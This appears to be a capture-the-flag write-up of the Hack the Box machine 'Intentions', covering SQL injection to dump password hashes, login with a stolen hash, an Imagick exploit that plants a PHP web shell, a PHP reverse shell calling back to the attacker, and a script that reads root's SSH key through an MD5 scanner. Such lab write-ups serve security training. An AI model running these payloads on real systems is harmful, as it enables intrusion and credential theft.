---
title: "HTB • Intentions"
tags:
  - "Advanced"
  - "Linux"
  - "Hard Difficulty"
  - "Web"
  - "API"
  - "PHP"
  - "File Upload"
  - "SQL Injection"
  - "Python"
  - "Cryptography"
excerpt: "Intentions is a hard Linux machine on Hack the Box that involves web exploitation, API testing, SQL injection, Git, and cryptography"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-intentions/"
---

Intentions is a hard Linux-based [**Hack the Box**](https://app.hackthebox.com/machines/Intentions) machine created by [**htbas9du**](https://app.hackthebox.com/users/388108) that covers topics including web API exploitation, SQL injection, and Linux privilege escalation. We first created an account on the target website and discovered an SQL injection vulnerability that allowed us to uncover credentials belonging to other users. Using credentials tied to a privileged account, we were able to access and exploit an image editing feature that used the Imagick PHP library to get an OS foothold as _www-data_. Next, we found a Git repository in the base web application directory that held OS credentials in previous commits, which we used to authenticate as _greg_. We then came across a program with special Linux capabilities used to evaluate files based on MD5 checksums. We abused this program with a pseudo-landslide cracking approach to read the root SSH private key and authenticate as root.

## Initial Recon

We began by setting up our environment and conducting a TCP port scan using a [custom nmap wrapper script](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh). This script aids in quickly and reliably scanning for open ports on the target.

```zsh
# Set up environment variables and run a port scan
echo rhost="10.10.11.220" >> .env
echo lhost="10.10.14.2" >> .env # Our HTB VPN client IP address
. ./.env && ctfscan $rhost
```
{:file="bryan@redteam ➤ zsh" .nolineno}

The scan reported two open ports:

| Transport | Port | Protocol | Product | Version                 |
|:----------|:-----|:---------|:--------|-------------------------|
| TCP       | 22   | SSH      | OpenSSH | 8.9p1 Ubuntu 3ubuntu0.1 |
| TCP       | 80   | HTTP     | nginx   | 1.18.0 (Ubuntu)         |

## Web

We first navigated to <http://10.10.11.220/> in BurpSuite's built-in Chromium browser. Upon visiting the web index, we were prompted to create an account or login with an email and password.

![Web index](web-index.png)

Before going any further, We decided to run a quick [dirsearch](https://github.com/maurosoria/dirsearch) scan for common files and directories on the website.

```zsh
curl -I http://$rhost/index.php # The site appears to be using PHP
dirsearch -u http://$rhost -e php,html -o $(pwd)/logs/dirsearch.%2F.log # Search for common files/directories
```
{:file="bryan@redteam ➤ zsh" .nolineno}

We were redirected to the login page when we requested [/gallery](http://10.10.11.220/gallery) and [/admin](http://10.10.11.220/admin), indicating that we were not authorized to visit those pages while unauthenticated. After creating an account and authenticating, the gallery page became accessible.

![User dashboard](web-gallery-dashboard.png)

We noticed that the profile tab has a new feature allowing users to customize their feed with a list of specific genres. Each time the _genres_ field is updated, a POST request is sent to [/api/v1/gallery/user/genres](http://10.10.11.220/api/v1/gallery/user/genres) and the user feed is updated using data requested from [/api/v1/gallery/user/feed](http://10.10.11.220/api/v1/gallery/user/feed). After observing the basic behavior of these endpoints, we created some quick Python helper functions to interact with the API.

```python
from requests import Session

URI = 'http://10.10.11.220'

sess = Session()
#sess.proxies = {'http': 'http://localhost:8080'} # Use BurpSuite proxy (optional)
opts = {'allow_redirects': False}

def login_helper(email, password):
  response = sess.post(URI + '/api/v1/auth/login',
    json={'email':email, 'password':password}, **opts)
  return response.status_code == 200

def genres_helper(genres):
  genres_response = sess.post(URI + '/api/v1/gallery/user/genres',
    json={'genres': genres}, **opts)
  if genres_response.status_code == 200:
    feed_response = sess.get(URI + '/api/v1/gallery/user/feed', **opts)
    try:
      return feed_response.status_code, feed_response.json()
    except:
      return feed_response.status_code, None
  return None, None
```
{:file="api.py"}

### SQL Injection

We noticed that updating our genres with a trailing single quote caused the feed API endpoint to return "Server Error", while any other printable character seemed to pass without error. This is usually a good sign that an injection vulnerability is present. We verified that an SQL injection vulnerability exists by observing the difference between responses containing valid SQL keywords versus invalid keywords. We concluded that the injection point is enclosed in parenthesis after additional fuzzing. In addition, we noticed some weird behavior involving the use of spaces surrounding keywords, which was circumvented using MySQL multi-line comments.

```python
# Verify SQL injection vulnerability
assert login_helper('pwn@htb.local', 'hq9zyYB3hlSWO5Dp'), 'Login failed' # Login with existing account
assert genres_helper("' OR ''='")[0] == 200 # Valid keyword passes without error
assert genres_helper("' XX ''='")[0] == 500 # Invalid keyword causes internal error

# Observe behavior of injection point
print(genres_helper("'#")[0]) # Internal error because opening parenthesis is unmatched
print(genres_helper("')#")[0]) # Successful because opening parenthesis is matched
print(genres_helper("') OR 1=1#")[0]) # Spaces seem to trigger internal error
print(genres_helper("')OR/**/1=1#")[0]) # Avoiding spaces proves successful
```
{:file="bryan@redteam ➤ python3" .nolineno}

#### UNION Queries

We decided to use the `UNION SELECT` statement with five columns to exfiltrate data.

```python
# Find number of columns to match (at least 4 judging from the keys in the response body)
print(genres_helper("')UNION/**/SELECT+1,2,3,4#")) # Query fails.. Probably >4 columns
print(genres_helper("')UNION/**/SELECT+1,2,3,4,5#")) # Success! Original statment queries 5 columns

# Exfiltrate database values
print(genres_helper("')UNION/**/SELECT+1,2,@@version,4,5#")[1]['data'][0]['genre']) # Fetch version
```
{:file="bryan@redteam ➤ python3" .nolineno}

We were able to successfully exfiltrate the MySQL version string, so we created a function to easily fetch values. At this point, we began to map the schema and search for relevant information.

```python
def sqli(query):
  query = query.replace(' ', '/**/')
  response = genres_helper(f"')UNION/**/SELECT+1,2,({query}),4,5#")
  try:
    return response[1]['data'][0]['genre']
  except:
    return None

# List databases -> information_schema,intentions
print(sqli("SELECT group_concat(schema_name) FROM information_schema.schemata"))
# List tables in database 'intentions' -> gallery_images,personal_access_tokens,migrations,users
print(sqli("SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='intentions'"))
# List columns in table 'intentions.users' -> id,name,email,password,created_at,updated_at,admin,genres
print(sqli("SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'"))
```
{:file="bryan@redteam ➤ python3" .nolineno}

We located the table "intentions.users" and dumped the the email addresses, names, and bcrypt password hashes associated with the site's registered accounts.

```python
# Fetch columns from users table: name, email, password, admin
response = sqli("SELECT group_concat(name,'|',email,'|',password,'|',admin) FROM intentions.users")
assert response, 'Query failed.. Did you call login_helper?'
csv = 'name,email,password,admin\n' + response.replace(',', '\n').replace('|', ',')
print(csv)
```
{:file="bryan@redteam ➤ python3" .nolineno}

Two of these users, _steve_ and _greg_, appeared to be both employees and website administrators. We tried cracking the associated password hashes for these users, but to no avail.

### Alternative API

We eventually found the API v2 prefix and the [/api/v2/auth/login](http://10.10.11.220/api/v1/auth/login) endpoint while manually searching for additional endpoints related to authentication. The v2 login endpoint differs from v1 because it doesn't actually require the cleartext password. Instead, it asks that we supply the _hash_ parameter which is just the associated password hash.

```zsh
# Investigate v2 login endpoint
curl -i "http://$rhost/api/v2/auth/login" -XOPTIONS # There is a v2 login endpoint!
curl -i "http://$rhost/api/v2/auth/login" -XPOST # It requires two parameters: email, hash

# Login using known admin credentials
hash='[REDACTED]' # bcrypt hash associated with email "steve@intentions.htb"
curl -i "http://$rhost/api/v2/auth/login" -H "Content-Type: application/json" \
  -d '{"email":"steve@intentions.htb","hash":"'"$hash"'"}' # Success + JWT
```
{:file="bryan@redteam ➤ zsh" .nolineno}

We were able to use the bcrypt hash associated with the email "steve@intentions.htb" to authenticate and collect a privileged JWT. We then repeated this request in BurpSuite's built-in browser and verified that we were logged in as the privileged user. 

![Steve's profile page](web-steve.png)

### Web Administration

The [/admin](http://10.10.11.220/admin) page was accessible using the hijacked admin account. This page included some additional actions along with seemingly relevant news regarding the website.

> **v2 API Update**
>
Hey team, I've deployed the v2 API to production and have started using it in the admin section. Let me know if you spot any bugs. This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable. This should take care of the concerns raised by our users regarding our lack of HTTPS connection.
>
The v2 API also comes with some **neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page**, but feel free to browse all of the available effects for the module and suggest some: [Image Feature Reference](https://www.php.net/manual/en/class.imagick.php)

The announcement mentioned an image editing feature and dropped a reference to the documentation for [Imagick](https://www.php.net/manual/en/class.imagick.php), an image processing library for PHP. We proceeded to visit the _Images_ tab then selected an image to edit.

![Image editing page](web-admin-image-edit.png)

Below the image, we found a table containing key-value pairs. The _path_ attribute seems to disclose the website's absolute path on the local filesystem. With the image path known, we can deduce that the primary web root is located at `/var/www/html/intentions`{:.filepath}. This information could become relevant when exploiting file access vulnerabilities.

![Image details](web-admin-image-details.png)

Next, we applied an effect to the image and observed the associated API call via BurpSuite.

```http
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.10.11.220
Content-Type: application/json
Cookie: token=[REDACTED]
Content-Length: 119

{"path":"/var/www/html/intentions/storage/app/public/animals/dickens-lin-Nr7QqJIP8Do-unsplash.jpg","effect":"charcoal"}
```
{:.nolineno}

We inferred that this endpoint uses the previously mentioned Imagick PHP library to transform the specified image. We eventually came across [this article](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) while in search of potential exploits. The article highlights an exploit chain that could impact applications that call the Imagick class constructor with untrusted input. We proceeded to follow the exploit guide, making a few adjustments along the way.

```zsh
# Setup variables
srvport=8080
srvhost="$lhost"
luri="http://$srvhost:$srvport"
payload='<?php eval($_POST[7]);?>'

# Create exploit files
mkdir exploit
convert xc:white -set Copyright "$payload" exploit/nS3icw.png
cat << EOF > exploit/cWKI3g.msl
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="$luri/nS3icw.png" />
 <write filename="/var/www/html/intentions/storage/app/public/nS3icw.php" />
</image>
EOF

# Start HTTP server
python3 -m http.server -b $lhost -d exploit $srvport &> exploit-server.log &

# Trigger file upload
curl "http://$rhost/api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=_" \
  -b "token=$admin_token" -F 'exec=@exploit/cWKI3g.msl'
```
{:file="bryan@redteam ➤ zsh" .nolineno}

We successfully uploaded an image containing a PHP web shell to [/storage/nS3icw.php](http://10.10.11.220/storage/nS3icw.php). A reverse shell session was established by starting a [PwnCat](https://pypi.org/project/pwncat-cs/) listener and sending a PHP reverse shell command to the uploaded web shell.

```zsh
# Start PwnCat listener on port 8443
pwncat-cs -l $lhost 8443

# (In another tab) Send PHP reverse shell code
code='$s=fsockopen("'$lhost'",8443);proc_open("sh",array($s,$s,$s),$pipes);'
curl "http://$rhost/storage/nS3icw.php" --data-urlencode "7=$code"
```
{:file="bryan@redteam ➤ zsh" .nolineno}

> Your web shell may be deleted before you execute anything. If this is the case, try uploading it again.
{:.prompt-warning}

## Privilege Escalation

We compressed and downloaded the entire `/var/www/html/intentions`{:.filepath} directory for further analysis. After noticing a populated `.git`{:.filepath} directory, we displayed the logs and inspected the different commits. One of the commits happened to note a password associated with the user _greg_, which happens to match the local account.

```bash
# Investigate git repository
cd intentions
git log --all # Display commit logs
git show # Nothing interesting from the latest commit
git show f7c903 # Found a password with email "greg@intentions.htb"
```
{:file="bryan@redteam ➤ zsh" .nolineno}

We proceeded to login with these credentials via SSH.

### Scanner

In `/home/greg`{:.filepath}, we noticed a shell script that executes `/opt/scanner/scanner`{:.filepath} with some arguments. We discovered that `/opt/scanner/scanner`{:.filepath} is granted special capabilities after noticing that it could read files in `/home/legal/uploads`{:.filepath} while other standard executables under our current context could not.

```bash
# Investigate scanner executable
getcap /opt/scanner/scanner # Granted cap_dac_read_search=ep -> privileged file reading
/opt/scanner/scanner --help # Check help menu
```
{:file="greg@intentions ➤ bash" .nolineno}

Judging by the help menu, the purpose of this program is to evaluate and compare files using MD5 digests. We also spotted a potentially dangerous feature specified in the help menu that could allow us to recover protected files from MD5 checksum values. The `-l` flag seemingly allows us to specify how many bytes we want to hash from the given file. If we were to collect the MD5 checksum at each position in a file, it would be trivial to crack each value and recover the file contents. We created a simple Python script to handle this task.

```python
from hashlib import md5
import sys, subprocess, string

assert len(sys.argv) == 2, "Please supply a file path"

hashes, known = [], []

# Collect a checksum at each offset
end = 1
while True:
  proc = ['/opt/scanner/scanner', '-p', '-s', '_', '-c', sys.argv[1], '-l', str(end)]
  try:
    out = subprocess.check_output(proc)
    hashes.append(bytes.fromhex(out[-33:].decode()))
    end += 1
  except:
    break

# Crack each hash
charset = string.printable.encode()
for checksum in hashes:
  for char in charset:
    if md5(bytes([*known, char])).digest() == checksum:
      known.append(char)
      break

print(bytes(known).decode(), end='')
```
{:file="read.py"}

With this script, we were able to fetch the root user's SSH private key at `/root/.ssh/id_rsa`{:.filepath}. Then we simply used the key to login as root via SSH.

```bash
# Recover root SSH private key + login as root
scp read.py greg@$rhost:/tmp/read.py
ssh greg@$rhost "python3 /tmp/read.py /root/.ssh/id_rsa 2>/dev/null" | tee root_id_rsa
chmod 600 root_id_rsa && ssh -i root_id_rsa root@$rhost
```
{:file="bryan@redteam ➤ zsh" .nolineno}
